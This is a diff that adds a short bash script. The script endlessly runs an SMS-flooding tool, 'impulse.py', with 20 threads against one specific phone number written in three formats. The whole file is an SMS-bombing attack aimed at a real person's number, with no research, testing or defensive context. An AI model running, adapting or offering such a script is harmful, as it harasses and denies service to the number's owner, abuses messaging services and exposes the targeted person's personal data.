@@ -1,0 +1,16 @@
+#!/bin/bash
+
+_time=10
+_threads=20
+_number=+380951162744
+_number2=380951162744
+_number3=0951162744
+
+while [ 1=1 ]
+do
+python impulse.py --method SMS --time $_time --threads $_threads --target $_number
+
+python impulse.py --method SMS --time $_time --threads $_threads --target $_number2
+
+python impulse.py --method SMS --time $_time --threads $_threads --target $_number3
+done
